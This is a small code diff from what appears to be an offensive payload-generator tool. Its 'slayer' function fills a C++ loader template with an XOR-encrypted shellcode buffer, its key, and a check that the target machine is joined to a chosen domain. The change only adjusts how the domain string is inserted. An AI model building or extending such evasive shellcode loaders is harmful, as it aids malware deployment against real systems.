@@ -148,7 +148,7 @@ def slayer(domain,payload_type, ip, port, arch):
     template = open("template.cpp", "rt")
     data = template.read()
     time.sleep(1)
-    data = data.replace('if (!Isdomainjoined(L"//CHANGETHISFORDOMAIN")) {', 'if (!Isdomainjoined(L"//'+ domain +'")) {')
+    data = data.replace('if (!Isdomainjoined(L"//CHANGETHISFORDOMAIN")) {', 'if (!Isdomainjoined(L"'+ domain +'")) {')
     data = data.replace('unsigned char buf[] = " ";', "unsigned char buf[] = " + ciphertext + " ")
     data = data.replace('char key[] = " "','char key[] = "' + xorkey + '"')
     data = data.replace("key", xorkey)
